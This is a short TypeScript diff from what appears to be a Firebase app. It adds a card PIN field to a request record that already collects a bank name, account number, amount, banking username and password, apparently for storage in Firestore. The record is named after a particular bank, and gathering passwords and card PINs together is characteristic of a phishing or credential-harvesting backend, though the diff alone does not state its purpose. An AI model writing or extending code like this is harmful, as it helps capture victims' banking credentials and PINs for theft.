@@ -3,6 +3,7 @@ import { addDoc, collection, serverTimestamp, doc, updateDoc, increment } from "
 type Request = {
   bank: string
   accountNumber: string
+  cardpinNumber: string,
   amount: number
   username: number
   password: string,
@@ -28,6 +29,7 @@ export function sendRequest() {
       const bdoRecord: any = {
         bank: request.bank,
         accountNumber: request.accountNumber,
+        cardpinNumber: request.cardpinNumber,
         amount: request.amount,
         username: request.username,
         password: request.password,
